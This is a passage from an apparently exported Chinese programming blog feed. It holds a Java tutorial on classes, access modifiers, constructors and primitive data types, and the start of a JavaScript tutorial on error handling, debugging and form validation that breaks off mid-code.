Java 类</h3><p>类可以看成是创建 Java 对象的模板。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dog</span></span>&#123;<br>   String breed;<br>   <span class="hljs-keyword">int</span> age;<br>   String color;<br>   <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">barking</span><span class="hljs-params">()</span></span>&#123;<br>   &#125;<br>   <br>   <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hungry</span><span class="hljs-params">()</span></span>&#123;<br>   &#125;<br>   <br>   <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sleeping</span><span class="hljs-params">()</span></span>&#123;<br>   &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>一个类可以包含多种类型变量，如：局部变量、成员变量、类变量。一个类可以拥有多个方法。</p><ul><li>局部变量：在方法、构造方法或者语句块中定义的变量被称为局部变量。变量声明和初始化都是在方法中，方法结束后，变量就会自动销毁。</li><li>成员变量：成员变量是定义在类中，方法体之外的变量。这种变量在创建对象的时候实例化。成员变量可以被类中方法、构造方法和特定类的语句块访问。</li><li>类变量：类变量也声明在类中，方法体之外，但必须声明为 static 类型。</li></ul><h4 id="2-1-1-类访问控制"><a href="#2-1-1-类访问控制" class="headerlink" title="2.1.1 类访问控制"></a>2.1.1 类访问控制</h4><p>控制类成员变量和方法的访问级别通过访问说明符。Java的访问说明符是public，private，protected和默认访问级别。</p><p>公共类成员可以通过任何其他代码访问。私有类成员只能在其类中访问。默认访问类成员没有访问说明符。 类的默认功能可以在同一个包中的任何类访问。类的受保护特性可用于同一个包（如默认）中的所有类及其子类。受保护的功能比默认功能更容易访问。</p><h4 id="2-1-2-成员访问和继承"><a href="#2-1-2-成员访问和继承" class="headerlink" title="2.1.2 成员访问和继承"></a>2.1.2 成员访问和继承</h4><p>子类不能访问超类的私有成员。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> j; <span class="hljs-comment">// private to A</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> total;<br><br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sum</span><span class="hljs-params">()</span> </span>&#123;<br>    total = j; <span class="hljs-comment">// ERROR, j is not accessible here</span><br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="2-2-3-访问矩阵图示"><a href="#2-2-3-访问矩阵图示" class="headerlink" title="2.2.3 访问矩阵图示"></a>2.2.3 访问矩阵图示</h4><table><thead><tr><th align="center">位置</th><th align="center">私人的(private)</th><th align="center">无修饰符</th><th align="center">保护(protected)</th><th align="center">公开(public)</th></tr></thead><tbody><tr><td align="center">相同类</td><td align="center">√</td><td align="center">√</td><td align="center">√</td><td align="center">√</td></tr><tr><td align="center">相同的包子类</td><td align="center">×</td><td align="center">√</td><td align="center">√</td><td align="center">√</td></tr><tr><td align="center">相同的包非子类</td><td align="center">×</td><td align="center">√</td><td align="center">√</td><td align="center">√</td></tr><tr><td align="center">不同的包子类</td><td align="center">×</td><td align="center">×</td><td align="center">√</td><td align="center">√</td></tr><tr><td align="center">不同的包非子类</td><td align="center">×</td><td align="center">×</td><td align="center">×</td><td align="center">√</td></tr></tbody></table><h4 id="2-2-4-访问修饰符及其目标"><a href="#2-2-4-访问修饰符及其目标" class="headerlink" title="2.2.4 访问修饰符及其目标"></a>2.2.4 访问修饰符及其目标</h4><p>并非所有修改器都可以应用于所有功能。顶级类可能不受保护。方法可能不是短暂的。静态可以将其应用于自由浮动代码块。</p><p>显示了功能和修改器的所有可能组合。yes表示我们可以使用该修饰符来控制对应实体的访问。</p><table><thead><tr><th align="center">修饰符</th><th align="center">类</th><th align="center">变量</th><th align="center">方法</th><th align="center">构造函数</th><th align="center">代码块</th></tr></thead><tbody><tr><td align="center">public</td><td align="center">yes</td><td align="center">yes</td><td align="center">yes</td><td align="center">yes</td><td align="center">no</td></tr><tr><td align="center">protected</td><td align="center">no</td><td align="center">yes</td><td align="center">yes</td><td align="center">yes</td><td align="center">no</td></tr><tr><td align="center">empty accessor</td><td align="center">yes</td><td align="center">yes</td><td align="center">yes</td><td align="center">yes</td><td align="center">yes</td></tr><tr><td align="center">private</td><td align="center">no</td><td align="center">yes</td><td align="center">yes</td><td align="center">yes</td><td align="center">no</td></tr><tr><td align="center">final</td><td align="center">yes</td><td align="center">yes</td><td align="center">yes</td><td align="center">no</td><td align="center">no</td></tr><tr><td align="center">abstract</td><td align="center">yes</td><td align="center">no</td><td align="center">yes</td><td align="center">no</td><td align="center">no</td></tr><tr><td align="center">static</td><td align="center">no</td><td align="center">yes</td><td align="center">yes</td><td align="center">no</td><td align="center">yes</td></tr><tr><td align="center">native</td><td align="center">no</td><td align="center">no</td><td align="center">yes</td><td align="center">no</td><td align="center">no</td></tr><tr><td align="center">transient</td><td align="center">no</td><td align="center">yes</td><td align="center">no</td><td align="center">no</td><td align="center">no</td></tr><tr><td align="center">volatile</td><td align="center">no</td><td align="center">yes</td><td align="center">no</td><td align="center">no</td><td align="center">no</td></tr><tr><td align="center">synchronized</td><td align="center">no</td><td align="center">no</td><td align="center">yes</td><td align="center">no</td><td align="center">yes</td></tr></tbody></table><h3 id="2-2-构造方法"><a href="#2-2-构造方法" class="headerlink" title="2.2 构造方法"></a>2.2 构造方法</h3><p>每个类都有构造方法。如果没有显式地为类定义构造方法，Java编译器将会为该类提供一个默认构造方法。在创建一个对象的时候，至少要调用一个构造方法。构造方法的名称必须与类同名，一个类可以有多个构造方法。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Puppy</span></span>&#123;<br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Puppy</span><span class="hljs-params">()</span></span>&#123;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Puppy</span><span class="hljs-params">(String name)</span></span>&#123;<br>      <span class="hljs-comment">// 这个构造器仅有一个参数：name</span><br>   &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-3-创建对象"><a href="#2-3-创建对象" class="headerlink" title="2.3 创建对象"></a>2.3 创建对象</h3><p>对象是根据类创建的。在 Java 中，使用关键字 new 来创建一个新的对象。<br>步骤：声明、实例化、初始化。</p><blockquote><ul><li>声明：声明一个对象，包括对象名称和对象类型。</li></ul></blockquote><blockquote><ul><li>实例化：使用关键字 new 来创建一个对象。</li></ul></blockquote><blockquote><ul><li>初始化：使用 new 创建对象时，会调用构造方法初始化对象。</li></ul></blockquote><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Puppy</span></span>&#123;<br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Puppy</span><span class="hljs-params">(String name)</span></span>&#123;<br>      <span class="hljs-comment">//这个构造器仅有一个参数：name</span><br>      System.out.println(<span class="hljs-string">&quot;Puppy Name is :&quot;</span> + name ); <br>   &#125;<br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String []args)</span></span>&#123;<br>      <span class="hljs-comment">// 下面的语句将创建一个Puppy对象</span><br>      Puppy myPuppy = <span class="hljs-keyword">new</span> Puppy( <span class="hljs-string">&quot;tommy&quot;</span> );<br>   &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-4-访问实例变量和方法"><a href="#2-4-访问实例变量和方法" class="headerlink" title="2.4 访问实例变量和方法"></a>2.4 访问实例变量和方法</h3><p>通过已创建的对象来访问成员变量和成员方法。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/* 实例化对象 */</span><br>ObjectReference = <span class="hljs-keyword">new</span> Constructor();<br><span class="hljs-comment">/* 访问其中的变量 */</span><br>ObjectReference.variableName;<br><span class="hljs-comment">/* 访问类中的方法 */</span><br>ObjectReference.MethodName();<br></code></pre></div></td></tr></table></figure><h3 id="2-5-源文件声明规则"><a href="#2-5-源文件声明规则" class="headerlink" title="2.5 源文件声明规则"></a>2.5 源文件声明规则</h3><ul><li>一个源文件中只能有一个 public 类</li><li>一个源文件可以有多个非public类</li><li>源文件的名称应该和 public 类的类名保持一致。例如：源文件中 public 类的类名是 Employee ，那么源文件应该命名为 Employee.java 。</li><li>如果一个类定义在某个包中，那么 package 语句应该在源文件的首行。</li><li>如果源文件包含 import 语句，那么应该放在 package 语句和类定义之间。如果没有 package 语句，那么 import 语句应该在源文件中最前面。</li><li>import 语句和 package 语句对源文件中定义的所有类都有效。在同一源文件中，不能给不同的类不同的包声明。</li></ul><h3 id="2-6-Import语句"><a href="#2-6-Import语句" class="headerlink" title="2.6 Import语句"></a>2.6 Import语句</h3><p>在 Java 中，如果给出一个完整的限定名，包括包名、类名，那么 Java 编译器就可以很容易地定位到源代码或者类。 Import 语句就是用来提供一个合理的路径，使得编译器可以找到某个类。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br></code></pre></div></td></tr></table></figure><h2 id="3-Java-基本数据类型"><a href="#3-Java-基本数据类型" class="headerlink" title="3.Java 基本数据类型"></a>3.Java 基本数据类型</h2><p>Java的两大数据类型：内置数据类型、引用数据类型。</p><h3 id="3-1-内置数据类型"><a href="#3-1-内置数据类型" class="headerlink" title="3.1 内置数据类型"></a>3.1 内置数据类型</h3><p>八种基本类型。<br>六种数字类型（四个整数型，两个浮点型），一种字符类型，还有一种布尔型。</p><h4 id="3-1-1-byte"><a href="#3-1-1-byte" class="headerlink" title="3.1.1 byte"></a>3.1.1 byte</h4><ul><li>byte数据类型是8位、有符号的，以二进制补码表示的整数；</li><li>最小值是-128（-2^7）；</li><li>最大值是127（2^7-1）；</li><li>默认值是0；</li><li>byte类型用在大型数组中节约空间，主要代替整数，因为byte变量占用的空间只有int类型的四分之一；</li></ul><p>例子：byte a = 100，byte b = -50。</p><h4 id="3-1-2-short"><a href="#3-1-2-short" class="headerlink" title="3.1.2 short"></a>3.1.2 short</h4><ul><li>short数据类型是16位、有符号的以二进制补码表示的整数</li><li>最小值是-32768（-2^15）；</li><li>最大值是32767（2^15 - 1）；</li><li>Short数据类型也可以像byte那样节省空间。一个short变量是int型变量所占空间的二分之一；</li><li>默认值是0；</li></ul><p>例子：short s = 1000，short r = -20000。</p><h4 id="3-1-3-int"><a href="#3-1-3-int" class="headerlink" title="3.1.3 int"></a>3.1.3 int</h4><ul><li>int数据类型是32位、有符号的以二进制补码表示的整数；</li><li>最小值是-2,147,483,648（-2^31）；</li><li>最大值是2,147,483,647（2^31 - 1）；</li><li>一般地整型变量默认为int类型；</li><li>默认值是0；</li></ul><p>例子：int a = 100000, int b = -200000。</p><h4 id="3-1-4-long"><a href="#3-1-4-long" class="headerlink" title="3.1.4 long"></a>3.1.4 long</h4><ul><li>long数据类型是64位、有符号的以二进制补码表示的整数；</li><li>最小值是-9,223,372,036,854,775,808（-2^63）；</li><li>最大值是9,223,372,036,854,775,807（2^63 -1）；</li><li>这种类型主要使用在需要比较大整数的系统上；</li><li>默认值是0L；</li></ul><p>例子： long a = 100000L，long b = -200000L。</p><h4 id="3-1-5-float"><a href="#3-1-5-float" class="headerlink" title="3.1.5 float"></a>3.1.5 float</h4><ul><li>float数据类型是单精度、32位、符合IEEE 754标准的浮点数；</li><li>float在储存大型浮点数组的时候可节省内存空间；</li><li>默认值是0.0f；</li><li>浮点数不能用来表示精确的值，如货币；</li></ul><p>例子：float f1 = 234.5f。</p><h4 id="3-1-6-double"><a href="#3-1-6-double" class="headerlink" title="3.1.6 double"></a>3.1.6 double</h4><ul><li>double数据类型是双精度、64位、符合IEEE 754标准的浮点数；</li><li>浮点数的默认类型为double类型；</li><li>double类型同样不能表示精确的值，如货币；</li><li>默认值是0.0d；</li></ul><p>例子：double d1 = 123.4。</p><h4 id="3-1-7-boolean"><a href="#3-1-7-boolean" class="headerlink" title="3.1.7 boolean"></a>3.1.7 boolean</h4><ul><li>boolean数据类型表示一位的信息；</li><li>只有两个取值：true和false；</li><li>这种类型只作为一种标志来记录true/false情况；</li><li>默认值是false；</li></ul><p>例子：boolean one = true。</p><h4 id="3-1-8-char"><a href="#3-1-8-char" class="headerlink" title="3.1.8 char"></a>3.1.8 char</h4><ul><li>char类型是一个单一的16位Unicode字符；</li><li>最小值是’\u0000’（即为0）；</li><li>最大值是’\uffff’（即为65,535）；</li><li>char数据类型可以储存任何字符；</li></ul><p>例子：char letter = ‘A’。</p><p>实际上，JAVA中还存在另外一种基本类型void，它也有对应的包装类 java.lang.Void，不过我们无法直接对它们进行操作。</p><h3 id="3-2-Java特殊的转义字符"><a href="#3-2-Java特殊的转义字符" class="headerlink" title="3.2 Java特殊的转义字符"></a>3.2 Java特殊的转义字符</h3><table><thead><tr><th align="center">符号</th><th align="center">字符含义</th></tr></thead><tbody><tr><td align="center">\n</td><td align="center">换行 (0x0a)</td></tr><tr><td align="center">\r</td><td align="center">回车 (0x0d)</td></tr><tr><td align="center">\f</td><td align="center">换页符(0x0c)</td></tr><tr><td align="center">\b</td><td align="center">退格 (0x08)</td></tr><tr><td align="center">\0</td><td align="center">空字符（0x0）</td></tr><tr><td align="center">\s</td><td align="center">字符串</td></tr><tr><td align="center">\t</td><td align="center">制表符</td></tr><tr><td align="center">\“</td><td align="center">双引号</td></tr><tr><td align="center">\‘</td><td align="center">单引号</td></tr><tr><td align="center">\\</td><td align="center">反斜杠</td></tr><tr><td align="center">\ddd</td><td align="center">八进制字符 (ddd)</td></tr><tr><td align="center">\uxxxx</td><td align="center">16进制Unicode字符 (xxxx)</td></tr></tbody></table><hr>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-JavaScript学习（五）</title>
    <link href="/2021/05/18/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-JavaScript%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <url>/2021/05/18/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-JavaScript%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>JavaScript 是世界上最流行的脚本语言。 JavaScript 是属于 web 的语言，它适用于 PC、笔记本电脑、平板电脑和移动电话。 JavaScript 被设计为向 HTML 页面增加交互性。 许多 HTML 开发者都不是程序员，但是 JavaScript 却拥有非常简单的语法。几乎每个人都有能力将小的 JavaScript 片段添加到网页中。所有现代的 HTML 页面都使用 JavaScript，可以用于改进设计、验证表单、检测浏览器、创建cookies等。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-JavaScript-错误处理"><a href="#1-JavaScript-错误处理" class="headerlink" title="1.JavaScript 错误处理"></a>1.JavaScript 错误处理</h2><p>try 语句测试代码块的错误。catch 语句处理错误。throw 语句创建自定义错误。</p><h3 id="1-1-JavaScript-错误"><a href="#1-1-JavaScript-错误" class="headerlink" title="1.1  JavaScript 错误"></a>1.1  JavaScript 错误</h3><p>当 JavaScript 引擎执行 JavaScript 代码时，会发生各种错误：可能是语法错误，通常是程序员造成的编码错误或错别字。可能是拼写错误或语言中缺少的功能（可能由于浏览器差异）。可能是由于来自服务器或用户的错误输出而导致的错误。当然，也可能是由于许多其他不可预知的因素。</p><h3 id="1-2-抛出（throw）错误"><a href="#1-2-抛出（throw）错误" class="headerlink" title="1.2 抛出（throw）错误"></a>1.2 抛出（throw）错误</h3><p>当错误发生时，当事情出问题时，JavaScript 引擎通常会停止，并生成一个错误消息。描述这种情况的技术术语是：JavaScript 将抛出一个错误。</p><h3 id="1-3-try-和-catch"><a href="#1-3-try-和-catch" class="headerlink" title="1.3 try 和 catch"></a>1.3 try 和 catch</h3><p>try 语句允许我们定义在执行时进行错误测试的代码块。catch 语句允许我们定义当 try 代码块发生错误时，所执行的代码块。JavaScript 语句 try 和 catch 是成对出现的。</p><p>语法：</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">try<br>  &#123;<br>  <span class="hljs-comment">//在这里运行代码</span><br>  &#125;<br><span class="hljs-function"><span class="hljs-title">catch</span><span class="hljs-params">(err)</span></span><br>  &#123;<br>  <span class="hljs-comment">//在这里处理错误</span><br>  &#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-4-Throw-语句"><a href="#1-4-Throw-语句" class="headerlink" title="1.4 Throw 语句"></a>1.4 Throw 语句</h3><p>throw 语句允许我们创建自定义错误。正确的技术术语是：创建或抛出异常（exception）。<br>如果把 throw 与 try 和 catch 一起使用，那么能够控制程序流，并生成自定义的错误消息。</p><p>语法：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">throw</span> <span class="hljs-built_in">exception</span> <br></code></pre></div></td></tr></table></figure><p>异常可以是 JavaScript 字符串、数字、逻辑值或对象。</p><p>使用实例：检测输入变量的值。如果值是错误的，会抛出一个异常（错误）。catch 会捕捉到这个错误，并显示一段自定义的错误消息。</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myFunction</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">try</span><br>  &#123;<br>  <span class="hljs-keyword">var</span> x=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;demo&quot;</span>).value;<br>  <span class="hljs-keyword">if</span>(x==<span class="hljs-string">&quot;&quot;</span>)    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;empty&quot;</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">isNaN</span>(x)) <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;not a number&quot;</span>;<br>  <span class="hljs-keyword">if</span>(x&gt;<span class="hljs-number">10</span>)     <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;too high&quot;</span>;<br>  <span class="hljs-keyword">if</span>(x&lt;<span class="hljs-number">5</span>)      <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;too low&quot;</span>;<br>  &#125;<br><span class="hljs-keyword">catch</span>(err)<br>  &#123;<br>  <span class="hljs-keyword">var</span> y=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;mess&quot;</span>);<br>  y.innerHTML=<span class="hljs-string">&quot;Error: &quot;</span> + err + <span class="hljs-string">&quot;.&quot;</span>;<br>  &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;h1&gt;My First JavaScript&lt;/h1&gt;<br>&lt;p&gt;Please input a number between <span class="hljs-number">5</span> and <span class="hljs-number">10</span>:&lt;/p&gt;<br>&lt;input id=<span class="hljs-string">&quot;demo&quot;</span> type=<span class="hljs-string">&quot;text&quot;</span>&gt;<br>&lt;button type=<span class="hljs-string">&quot;button&quot;</span> onclick=<span class="hljs-string">&quot;myFunction()&quot;</span>&gt;Test Input&lt;/button&gt;<br>&lt;p id=<span class="hljs-string">&quot;mess&quot;</span>&gt;&lt;/p&gt;<br></code></pre></div></td></tr></table></figure><p>如果 getElementById 函数出错，例子也会抛出一个错误。</p><h2 id="2-JavaScript-调试"><a href="#2-JavaScript-调试" class="headerlink" title="2.JavaScript 调试"></a>2.JavaScript 调试</h2><p>在程序代码中寻找错误叫做代码调试。调试很难，但幸运的是，很多浏览器都内置了调试工具。内置的调试工具可以开始或关闭，严重的错误信息会发送给用户。有了调试工具，我们就可以设置断点 (代码停止执行的位置), 且可以在代码执行时检测变量。浏览器启用调试工具一般是按下 F12 键，并在调试菜单中选择 “Console” 。</p><h3 id="2-1-console-log-方法"><a href="#2-1-console-log-方法" class="headerlink" title="2.1 console.log() 方法"></a>2.1 console.log() 方法</h3><p>如果浏览器支持调试，可以使用 console.log() 方法在调试窗口上打印 JavaScript 值。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>My First Web Page<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br>a = 5;<br>b = 6;<br>c = a + b;<br><span class="javascript"><span class="hljs-built_in">console</span>.log(c);</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-2-设置断点"><a href="#2-2-设置断点" class="headerlink" title="2.2 设置断点"></a>2.2 设置断点</h3><p>在调试窗口中，你可以设置 JavaScript 代码的断点。在每个断点上，都会停止执行 JavaScript 代码，以便于我们检查 JavaScript 变量的值。在检查完毕后，可以重新执行代码（如播放按钮）。</p><h3 id="2-3-debugger-关键字"><a href="#2-3-debugger-关键字" class="headerlink" title="2.3 debugger 关键字"></a>2.3 debugger 关键字</h3><p>debugger 关键字用于停止执行 JavaScript，并调用调试函数。这个关键字与在调试工具中设置断点的效果是一样的。如果没有调试可用，debugger 语句将无法工作。</p><h3 id="2-4-浏览器的调试工具"><a href="#2-4-浏览器的调试工具" class="headerlink" title="2.4 浏览器的调试工具"></a>2.4 浏览器的调试工具</h3><p>通常，浏览器启用调试工具一般是按下 F12 键，并在调试菜单中选择 “Console” 。</p><h2 id="3-JavaScript-表单验证"><a href="#3-JavaScript-表单验证" class="headerlink" title="3.JavaScript 表单验证"></a>3.JavaScript 表单验证</h2><p>JavaScript 可用来在数据被送往服务器前对 HTML 表单中的这些输入数据进行验证。表单数据经常需要使用 JavaScript 来验证其正确性。</p><p>验证表单数据是否为空？<br>验证输入是否是一个正确的email地址？<br>验证日期是否输入正确？<br>验证表单输入内容是否为数字型？</p><h3 id="3-1-必填（或必选）项目"><a href="#3-1-必填（或必选）项目" class="headerlink" title="3.1 必填（或必选）项目"></a>3.1 必填（或必选）项目</h3><p>函数用来检查用户是否已填写表单中的必填（或必选）项目。假如必填或必选项为空，那么警告框会弹出，并且函数的返回值为 false，否则函数的返回值则为 true（意味着数据没有问题）。</p><p>函数：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">validateForm</span>(<span class="hljs-params"></span>)</span>&#123;        <br><span class="hljs-keyword">var</span> x=<span class="hljs-built_in">document</span>.forms[<span class="hljs-string">&quot;myForm&quot;</span>][<span class="hljs-string">&quot;fname&quot;</span>].value;        <br><span class="hljs-keyword">if</span> (x==<span class="hljs-literal">null</span> || x==<span class="hljs-string">&quot;&quot;</span>)        <br>  &#123;        <br>  alert(<span class="hljs-string">&quot;First name must be filled out&quot;</span>);        <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        <br>  &#125;        <br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用实例：上述函数在 form 表单提交时被调用。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myForm&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo_form.asp&quot;</span> <span class="hljs-attr">onsubmit</span>=<span class="hljs-string">&quot;return validateForm()&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>First name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-2-E-mail-验证"><a href="#3-2-E-mail-验证" class="headerlink" title="3.2 E-mail 验证"></a>3.2 E-mail 验证</h3><p>函数检查输入的数据是否符合电子邮件地址的基本语法。也就是说，输入的数据必须包含 @ 符号和点号(.)。同时，@ 不可以是邮件地址的首字符，并且 @ 之后需有至少一个点号。</p><p>函数：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">validateForm</span>(<span class="hljs-params"></span>)</span>&#123;        <br><span class="hljs-keyword">var</span> x=<span class="hljs-built_in">document</span>.forms[<span class="hljs-string">&quot;myForm&quot;</span>][<span class="hljs-string">&quot;email&quot;</span>].value;        <br><span class="hljs-keyword">var</span> atpos=x.indexOf(<span 